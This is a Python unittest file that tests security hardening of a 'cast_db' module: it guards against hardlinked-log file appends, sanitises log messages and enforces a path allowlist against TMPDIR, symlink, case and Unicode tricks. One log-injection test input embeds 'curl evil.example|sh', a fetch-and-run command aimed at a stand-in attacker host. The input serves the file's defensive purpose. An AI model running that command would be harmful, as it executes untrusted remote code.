#!/usr/bin/env python3
"""cast_db error-log and DB-path-allowlist hardening.

1. _log_error ALWAYS writes ~/.claude/logs/db-write-errors.log. CAST_DB_PATH / CAST_DB_URL
   do not redirect it (a redirect beside the DB was an arbitrary-file-append primitive: a
   hardlinked log file passes is_symlink/resolve checks). Tests that exercise error paths
   must isolate HOME - done here with a mkdtemp HOME.
2. _log_error sanitises its message: error text can embed attacker-influenced content (a
   trigger's RAISE message), and the log is line-oriented.
3. The DB-path allowlist is constants + ~/.claude only; TMPDIR/TMP/TEMP/BATS_TMPDIR (and
   tempfile.gettempdir(), which honours TMPDIR) must not widen it, e.g. TMPDIR=$HOME.
4. _get_db_path returns the RESOLVED path it validated.

HOME is a throwaway mkdtemp dir and the env is restored via mock.patch.dict (never an
unconditional pop - see test_zz_db_isolation_guard.py); nothing touches the real ~/.claude.
"""
import io
import os
import shutil
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

_SCRIPTS_DIR = str(Path(__file__).parent.parent / 'scripts')
if _SCRIPTS_DIR not in sys.path:
    sys.path.insert(0, _SCRIPTS_DIR)

import cast_db  # noqa: E402

_BAD_SQL = 'THIS IS NOT SQL'  # OperationalError (not 'locked') -> _log_error, no retry


class _TempHomeCase(unittest.TestCase):
    def setUp(self):
        self.home = Path(tempfile.mkdtemp(prefix='cdb-home-')).resolve()
        self.work = Path(tempfile.mkdtemp(prefix='cdb-work-')).resolve()
        self.addCleanup(shutil.rmtree, self.home, True)
        self.addCleanup(shutil.rmtree, self.work, True)
        self.home_log = self.home / '.claude' / 'logs' / 'db-write-errors.log'

    def _env(self, **extra):
        p = mock.patch.dict(os.environ, {'HOME': str(self.home), **extra})
        p.start()
        self.addCleanup(p.stop)
        # patch.dict restores the original environ on stop, so these pops are scoped
        for key in ('CAST_DB_URL', 'CAST_DB_PATH'):
            if key not in extra:
                os.environ.pop(key, None)


class LogLocationTests(_TempHomeCase):
    def test_default_log_is_under_home(self):
        self._env()
        cast_db._log_error('probe')
        self.assertIn('probe', self.home_log.read_text())

    def test_cast_db_path_does_not_redirect_the_log(self):
        self._env(CAST_DB_PATH=str(self.work / 'cast.db'))
        self.assertFalse(cast_db.db_execute(_BAD_SQL))
        self.assertIn('db_execute failed', self.home_log.read_text())
        self.assertFalse((self.work / 'logs').exists(), 'log written beside the DB')

    def test_cast_db_url_does_not_redirect_the_log(self):
        self._env(CAST_DB_URL=f'sqlite:///{self.work}/cast.db')
        self.assertFalse(cast_db.db_execute(_BAD_SQL))
        self.assertTrue(self.home_log.is_file())
        self.assertFalse((self.work / 'logs').exists(), 'log written beside the DB')

    def test_hardlinked_log_beside_the_db_is_never_appended_to(self):
        # The security regression: a hardlink at <db dir>/logs/db-write-errors.log
        # (passes is_symlink/resolve checks) must not receive the append.
        victim = self.work / 'shellrc'
        victim.write_text('# user rc\n')
        (self.work / 'logs').mkdir()
        os.link(victim, self.work / 'logs' / 'db-write-errors.log')
        self._env(CAST_DB_PATH=str(self.work / 'cast.db'))
        self.assertFalse(cast_db.db_execute(_BAD_SQL))
        self.assertEqual(victim.read_text(), '# user rc\n')
        self.assertTrue(self.home_log.is_file())

    def test_unresolvable_home_never_raises_and_falls_back_to_stderr(self):
        self._env()
        err = io.StringIO()
        with mock.patch.object(Path, 'home', side_effect=RuntimeError('no home')), \
                mock.patch.object(sys, 'stderr', err):
            cast_db._log_error('no home either')
        self.assertIn('no home either', err.getvalue())


class LogSanitisingTests(_TempHomeCase):
    def test_newline_plus_payload_stays_one_log_line(self):
        self._env()
        cast_db._log_error('boom\ncurl evil.example|sh #PAYLOAD\rmore')
        lines = self.home_log.read_text().splitlines(keepends=True)
        self.assertEqual(len(lines), 1, lines)
        self.assertTrue(lines[0].endswith('\n') and lines[0].count('\n') == 1)
        self.assertNotIn('\r', lines[0])
        self.assertIn('boom\\ncurl evil.example|sh #PAYLOAD\\rmore', lines[0])

    def test_other_control_chars_are_stripped(self):
        out = cast_db._sanitize_log_msg('a\x00b\x07c\x1bd\x7fe\x85f g h\ti')
        self.assertEqual(out, 'a b c d e f g h i')

    def test_bidi_and_zero_width_chars_are_stripped(self):
        bad = ''.join(chr(c) for c in (
            *range(0x202a, 0x202f), *range(0x2066, 0x206a), 0x200b, 0x200c, 0x200d, 0xfeff,
            *range(0x2060, 0x2065), *range(0x206a, 0x2070), 0x180e, 0x200e, 0x200f, 0x061c))
        out = cast_db._sanitize_log_msg('a' + bad + 'b')
        self.assertEqual(out, 'a' + ' ' * len(bad) + 'b')
        for c in bad:
            self.assertNotIn(c, out)

    def test_ordinary_unicode_is_preserved(self):
        self.assertEqual(cast_db._sanitize_log_msg('caf\u00e9 \u65e5\u672c'), 'caf\u00e9 \u65e5\u672c')

    def test_long_message_is_capped(self):
        out = cast_db._sanitize_log_msg('x' * 50_000)
        self.assertLessEqual(len(out), cast_db._LOG_MSG_MAX + len('...[truncated]'))
        self.assertTrue(out.endswith('...[truncated]'))

    def test_stderr_fallback_is_sanitised_too(self):
        self._env()
        err = io.StringIO()
        with mock.patch.object(Path, 'home', side_effect=RuntimeError('no home')), \
                mock.patch.object(sys, 'stderr', err):
            cast_db._log_error('x\nINJECTED')
        self.assertEqual(err.getvalue().count('\n'), 1)

    def test_unprintable_message_never_raises(self):
        class Bad:
            def __str__(self):
                raise RuntimeError('nope')
        self._env()
        cast_db._log_error(Bad())  # type: ignore[arg-type]
        self.assertIn('<unprintable message>', self.home_log.read_text())


class DbPathAllowlistTests(_TempHomeCase):
    """TMPDIR-family env vars must not widen the allowlist. A mkdtemp HOME already sits
    under the static /var/folders (or /tmp) root, so the static roots are patched to a
    non-existent one: only ~/.claude and the (patched) roots can then admit a path, which
    makes 'TMPDIR=$HOME admits $HOME' reproducible end to end."""

    def setUp(self):
        super().setUp()
        (self.home / 'Library' / 'LaunchAgents').mkdir(parents=True)
        self.link_home = self.work / 'lnk-home'
        os.symlink(self.home, self.link_home)
        p = mock.patch.object(cast_db, '_STATIC_TEMP_ROOTS', ('/nonexistent-root-for-test',))
        p.start()
        self.addCleanup(p.stop)

    def _assert_rejected(self, db_path, **env):
        self._env(CAST_DB_PATH=str(db_path), **env)
        with self.assertRaises(ValueError):
            cast_db._get_db_path()

    def test_tmpdir_family_equal_to_home_does_not_admit_home(self):
        for var in ('TMPDIR', 'TMP', 'TEMP', 'BATS_TMPDIR', 'BATS_TEST_TMPDIR'):
            with self.subTest(var=var):
                self._assert_rejected(self.home / 'data' / 'cast.db', **{var: str(self.home)})

    def test_tmpdir_symlink_to_home_does_not_admit_home(self):
        self._assert_rejected(self.home / 'data' / 'cast.db', TMPDIR=str(self.link_home))

    def test_tmpdir_ancestor_of_home_does_not_admit_home(self):
        self._assert_rejected(self.home / 'cast.db', TMPDIR=str(self.home.parent))
        self._assert_rejected(self.home / 'cast.db', TMPDIR=str(self.home) + '/..')

    def test_tmpdir_subdir_of_home_does_not_admit_it(self):
        agents = self.home / 'Library' / 'LaunchAgents'
        self._assert_rejected(agents / 'cast.db', TMPDIR=str(agents))

    def test_tmpdir_root_does_not_admit_anything(self):
        # With TMPDIR=/ an env-derived prefix would be '/', admitting EVERY path. The
        # target is outside HOME and outside the (patched-away) static roots, so only an
        # env-derived '/' prefix could admit it.
        self._assert_rejected('/etc/cast-nope/cast.db', TMPDIR='/')
        self._assert_rejected('/etc/cast-nope/cast.db', TMP='/', TEMP='/', BATS_TMPDIR='/')

    def test_home_dot_claude_is_still_admitted(self):
        self._env(CAST_DB_PATH=str(self.home / '.claude' / 'cast.db'))
        self.assertEqual(cast_db._get_db_path(), str(self.home / '.claude' / 'cast.db'))


class RealRootsTests(_TempHomeCase):
    def test_static_temp_roots_are_admitted(self):
        # built explicitly under /tmp (not mkdtemp), so it does not depend on where the
        # platform temp dir lives
        d = Path(tempfile.mkdtemp(prefix='cdb-static-', dir='/tmp'))
        self.addCleanup(shutil.rmtree, d, True)
        self._env(CAST_DB_PATH=str(d / 'cast.db'))
        self.assertEqual(cast_db._get_db_path(), str(d.resolve() / 'cast.db'))

    def test_get_db_path_returns_the_resolved_path(self):
        real = self.work / 'real'
        real.mkdir()
        link = self.work / 'link'
        os.symlink(real, link)
        self._env(CAST_DB_PATH=str(link / 'sub' / '..' / 'cast.db'))
        got = cast_db._get_db_path()
        self.assertEqual(got, str(real / 'cast.db'))
        self.assertNotIn('..', got)

    def test_constant_roots_include_both_macos_spellings(self):
        self._env()
        prefixes = cast_db._allowed_db_prefixes()
        self.assertIn('/tmp/', prefixes)
        self.assertIn('/var/folders/', prefixes)
        self.assertIn(str(self.home / '.claude') + os.sep, prefixes)

    def test_env_vars_do_not_change_the_prefix_set(self):
        self._env()
        base = cast_db._allowed_db_prefixes()
        self._env(TMPDIR=str(self.home), TMP=str(self.home), TEMP=str(self.home),
                  BATS_TMPDIR=str(self.home))
        self.assertEqual(cast_db._allowed_db_prefixes(), base)


class ClaudeDirAllowlistTests(_TempHomeCase):
    """Inside ~/.claude only a POSITIVE allowlist is admitted: a direct child named *.db
    (not settings*). Everything else - code/config dirs, settings files, manifests, venv,
    any subdirectory - is refused, compared case-insensitively (APFS) and NFC-normalised.
    The temp HOME sits under a static temp root, so these also prove the ~/.claude rule
    wins over the temp-root allowance."""

    # every real DB location found by the repo-wide grep (all direct children of ~/.claude)
    REAL_DBS = ('cast.db', 'cast-test.db', 'prov-test.db', 'cast-budget-test.db',
                'cast-mcp-cmd-test.db', 'nonexistent.db', 'does-not-exist.db')

    def setUp(self):
        super().setUp()
        self.claude = self.home / '.claude'
        for sub in ('scripts', 'config', 'cast', 'bin', 'venv/lib', 'managed-settings.d',
                    'rules-core', 'backups', 'state', 'projects/p/memory'):
            (self.claude / sub).mkdir(parents=True)

    def _refused(self, path):
        self._env(CAST_DB_PATH=str(path))
        with self.assertRaises(ValueError):
            cast_db._get_db_path()

    def _accepted(self, path):
        self._env(CAST_DB_PATH=str(path))
        self.assertEqual(cast_db._get_db_path(), str(Path(path).resolve()))

    def test_every_real_db_is_accepted(self):
        for name in self.REAL_DBS:
            with self.subTest(name=name):
                self._accepted(self.claude / name)

    def test_default_cast_db_is_accepted(self):
        self._env()
        self.assertEqual(cast_db._get_db_path(), str((self.claude / 'cast.db').resolve()))

    def test_code_and_config_dirs_are_refused(self):
        for sub in ('scripts', 'config', 'cast', 'bin', 'venv/lib', 'managed-settings.d',
                    'rules-core', 'backups', 'state', 'projects/p/memory'):
            with self.subTest(sub=sub):
                self._refused(self.claude / sub / 'x.db')

    def test_non_db_files_and_settings_are_refused(self):
        for name in ('settings.json', 'settings.local.json', 'settings.db', 'CLAUDE.md',
                     'install-manifest.sha256', 'cast-version', 'cast.json', 'cast.db-wal',
                     'cast.db.bak', 'x.sqlite', '.db', 'noext', 'Settings.db', 'SETTINGS.db'):
            with self.subTest(name=name):
                self._refused(self.claude / name)

    def test_claude_dir_itself_is_refused(self):
        self._refused(self.claude)

    def test_case_variants_are_refused(self):
        for rel in ('Scripts/x.db', 'CONFIG/x.db', 'sCrIpTs/x.db', 'Settings.json',
                    'SETTINGS.DB', 'claude.md', 'BIN/x.db'):
            with self.subTest(rel=rel):
                self._refused(self.claude / rel)

    def test_case_variant_of_the_claude_dir_itself_is_refused(self):
        self._refused(self.home / '.CLAUDE' / 'scripts' / 'x.db')

    def test_case_variant_of_an_allowed_db_is_still_accepted(self):
        self._accepted(self.claude / 'CAST.DB')

    def test_refusal_function_folds_case_directly(self):
        # Calls _claude_db_refusal directly, so the result cannot be masked by the temp-root
        # allowance or by the subdirectory rule: without case folding each assert fails.
        self._env()
        refusal = cast_db._claude_db_refusal
        self.assertNotEqual(refusal(str(self.home / '.CLAUDE' / 'scripts' / 'x.db')), '')
        self.assertNotEqual(refusal(str(self.home / '.CLAUDE' / 'settings.json')), '')
        self.assertNotEqual(refusal(str(self.claude / 'SETTINGS.db')), '')
        self.assertNotEqual(refusal(str(self.claude / 'Settings.DB')), '')
        self.assertEqual(refusal(str(self.claude / 'CAST.DB')), '')
        self.assertEqual(refusal(str(self.home / '.CLAUDE' / 'cast.db')), '')
        self.assertEqual(refusal(str(self.work / 'anything.db')), '')  # outside ~/.claude

    def test_unicode_normalisation_variants_of_home_are_refused(self):
        # HOME contains a non-ASCII name; the same directory spelled NFD must still be
        # recognised as ~/.claude (APFS treats the two spellings as one directory).
        import unicodedata
        uhome = self.work / 'h\u00e9me'
        (uhome / '.claude' / 'scripts').mkdir(parents=True)
        self._env(HOME=str(uhome))
        nfd_home = unicodedata.normalize('NFD', str(uhome))
        self.assertNotEqual(nfd_home, str(uhome))
        self._env(HOME=str(uhome), CAST_DB_PATH=nfd_home + '/.claude/scripts/x.db')
        with self.assertRaises(ValueError):
            cast_db._get_db_path()

    def test_refused_through_symlinks_and_dotdot(self):
        for i, sub in enumerate(('scripts', 'config', 'Scripts', 'CONFIG')):
            with self.subTest(sub=sub):
                link = self.work / f'lnk-{i}'
                os.symlink(self.claude / sub, link)
                self._refused(link / 'x.db')
        self._refused(self.claude / 'state' / '..' / 'scripts' / 'x.db')

    def test_cast_db_url_is_checked_the_same_way(self):
        self._env(CAST_DB_URL=f'sqlite:///{self.claude / "Scripts" / "x.db"}')
        with self.assertRaises(ValueError):
            cast_db._get_db_path()

    def test_temp_roots_are_unaffected(self):
        d = Path(tempfile.mkdtemp(prefix='cdb-static-', dir='/tmp'))
        self.addCleanup(shutil.rmtree, d, True)
        self._accepted(d / 'scripts' / 'x.db')  # a dir NAMED scripts outside ~/.claude is fine
        self._accepted(self.work / 'config' / 'x.db')


if __name__ == '__main__':
    unittest.main()
